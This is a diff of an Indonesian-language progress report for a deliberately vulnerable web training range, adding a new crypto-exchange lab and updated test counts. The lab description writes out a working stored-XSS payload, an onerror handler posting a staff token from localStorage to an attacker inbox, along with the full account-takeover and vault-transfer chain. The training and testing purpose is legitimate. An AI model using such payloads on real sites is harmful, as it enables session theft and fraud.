@@ -26,9 +26,9 @@ Hasil verifikasi lokal terakhir:
 
 | Gate | Hasil |
 |---|---|
-| `npx vitest run` | **4557 test lulus** (152 file) |
+| `npx vitest run` | **4559 test lulus** (152 file) |
 | `npm run typecheck` | exit 0 |
-| `npm run labs:test` | **112 PASS** — 4 lab × 4 level, termasuk check no-leak |
+| `npm run labs:test` | **119 PASS** — 4 lab × 4 level + r05 Binanse (Inquisitor-only), termasuk check no-leak |
 | `npm run range:verify` | **16/16 PASS**, launch-to-ready 1.0–1.5 s |
 | `npm run verify:dist` (full + lite) | OK |
 | `npm run range:build` | image portal & warden dibuat |
@@ -117,6 +117,15 @@ Sebelum enhancement, keempat lab hanya punya 2–3 halaman dan CSS minimal. Audi
 - **Inquisitor (chain):** `/preview` tidak merender pesan; menyimpan draft (≤32, id acak) dan mengembalikan `data-draft`; `/orders/<id>/print` merender draft sebagai template (second-order SSTI). Divine merender draft sebagai data (escaped), jadi payload tidak dieksekusi.
 - Identitas rose/plum, tekstur card stock, SVG mark/favicon, styled rejection card, 404/500, 375 px.
 
+### r05 — Binanse (Stored XSS, Hard-only)
+
+- Bursa kripto fiktif **Binanse** (mark geometris custom; bukan logo Binance), UI exchange gelap: ticker, market table, portfolio, wallet address `bn1…`, support ticket, dan staff/infrastructure console.
+- **Satu level Inquisitor saja** — tanpa pilihan difficulty, tanpa Divine. Poin 600 (Hard 300 × 2).
+- **Chain:** tiket support menyimpan body mentah; tombol “Request staff review” menjalankan body di **simulated staff browser** (`node:vm`). Sanitizer naif membuang `<script>`/`javascript:`, tetapi event handler lolos; payload `<img src=x onerror="fetch('/api/attacker/inbox',{method:'POST',body:localStorage.getItem('bn_staff_token')})">` mengirim token DevOps ke inbox. Token dipakai `/staff/login` → console “Signed in as devops”; PIN 6 digit dibaca di `/staff/settings`; pemain menambahkan wallet-nya ke whitelist, lalu `POST /staff/transfer` seluruh vault. Receipt berisi flag.
+- **Dua kunci**: sesi DevOps (dari XSS) dan withdrawal PIN (dari console) + whitelist; tidak bisa satu langkah.
+- Flag hanya ada di memori (dibaca dari file one-shot lalu di-unlink) dan hanya muncul di receipt transfer. Bot sandbox tidak diberi akses ke flag/`process`/`fs`; `codeGeneration.strings=false`.
+- UI exchange + staff console responsive 375 px; semua output pemain di-escape, ticket body hanya dieksekusi di bot.
+
 ### Flow portal
 
 - **Race capacity diperbaiki**: relaunch tidak lagi menghentikan lab lama lalu menolak start; keputusan capacity + reservasi slot atomik. Uji menutup skenario slot direbut user lain.
@@ -199,13 +208,13 @@ Belum dikerjakan (dicatat jujur):
 
 ### 7.1 Unit/integration (`npm test`)
 
-- **4557 test / 152 file lulus**, termasuk portal mode, auth/register/login, CSRF/Origin, katalog/filter, hint, submit, leaderboard, lifecycle, reaper, gate, forward-auth, warden, compose, images, fixture, rank E–S (threshold 3750), level Inquisitor/four-level manifest plus r05 Inquisitor-only, dan UI token/contrast.
+- **4559 test / 152 file lulus**, termasuk portal mode, auth/register/login, CSRF/Origin, katalog/filter, hint, submit, leaderboard, lifecycle, reaper, gate, forward-auth, warden, compose, images, fixture, rank E–S (threshold 3750), level Inquisitor/four-level manifests plus r05 Inquisitor-only, dan UI token/contrast.
 - `npm run typecheck` exit 0.
-- Catatan kejujuran: di mesin ini paralelisme fork default sempat OOM; run final memakai `--poolOptions.forks.maxForks=4 --poolOptions.forks.minForks=1` dan lulus **4557/4557**. Sebelumnya satu run juga sempat timeout pada satu test (flake timing suite lama), lalu dua rerun penuh lulus.
+- Catatan kejujuran: di mesin ini paralelisme fork default sempat OOM; run final memakai `--poolOptions.forks.maxForks=4 --poolOptions.forks.minForks=1` dan lulus **4559/4559**. Sebelumnya satu run juga sempat timeout pada satu test (flake timing suite lama), lalu dua rerun penuh lulus.
 
 ### 7.2 Black-box lab (`npm run labs:test`)
 
-- **112 PASS**: 4 lab × 4 level — health, solve referensi mendapat flag level itu (termasuk Inquisitor chain), solve level bawah gagal di level atas, Divine menolak semua solve, browse tidak membocorkan flag, tidak ada egress, **inspect/log/image/config tidak mengandung `HVWA{`**, file one-shot hilang. r05 Binanse menyusul satu level Inquisitor; angka final diisi ulang oleh controller setelah lab mendarat.
+- **119 PASS**: 4 lab × 4 level + r05 Binanse (Inquisitor-only) — health, solve referensi mendapat flag level itu (termasuk semua Inquisitor chain), solve level bawah gagal di level atas, Divine menolak semua solve, browse tidak membocorkan flag, tidak ada egress, **inspect/log/image/config tidak mengandung `HVWA{`**, file one-shot hilang.
 
 ### 7.3 Platform E2E (`npm run range:verify`)
 
